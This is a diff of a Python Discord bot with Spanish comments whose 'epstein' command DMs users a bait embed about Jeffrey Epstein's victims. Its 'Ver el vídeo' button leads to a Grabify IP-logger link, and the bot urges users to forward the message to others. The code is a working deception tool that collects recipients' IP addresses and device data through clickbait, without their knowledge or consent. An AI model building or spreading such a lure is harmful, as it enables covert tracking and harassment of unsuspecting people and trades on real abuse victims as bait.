@@ -2,7 +2,7 @@ import discord
 from discord import app_commands
 from discord.ext import commands
 
-TOKEN = "PEGA_AQUI_TU_TOKEN"   # ← Lo pondremos después en Railway
+TOKEN = "PEGA_AQUI_TU_TOKEN"   # ← Variable en Railway
 
 intents = discord.Intents.default()
 bot = commands.Bot(command_prefix='!', intents=intents)
@@ -14,14 +14,14 @@ async def on_ready():
 
 @bot.tree.command(name="epstein", description="Te envía el troll a tu MD")
 async def epstein(interaction: discord.Interaction):
-    tracker_url = "https://grabify.link/L8A6UR"   # ← Tu link de Grabify
+    tracker_url = "https://grabify.link/L8A6UR"   # Tu link de Grabify
 
     embed = discord.Embed(
         title="Jeffrey Epstein víctimas",
         description="Haz clic para ver el vídeo completo 👇\n(Cuidado...)",
         color=0x000000
     )
-    embed.set_image(url="https://i.imgur.com/TU_IMAGEN_EPSTEIN.jpg")  # ← Cambia por tu URL de Imgur
+    embed.set_image(url="https://abc7.com/amp/post/congreso-aprueba-divulgar-archivos-de-jeffrey-epstein/18171112/")  # ← Cambia esta línea por URL directa de imagen
 
     view = discord.ui.View()
     button = discord.ui.Button(label="Ver el vídeo", style=discord.ButtonStyle.red, url=tracker_url)
@@ -31,6 +31,6 @@ async def epstein(interaction: discord.Interaction):
         await interaction.user.send(embed=embed, view=view)
         await interaction.response.send_message("✅ Te envié el troll a tu privado. Reenvíalo a quien quieras.", ephemeral=True)
     except:
-        await interaction.response.send_message("❌ Activa mensajes privados del servidor.", ephemeral=True)
+        await interaction.response.send_message("❌ Activa los mensajes privados del servidor.", ephemeral=True)
 
 bot.run(TOKEN)
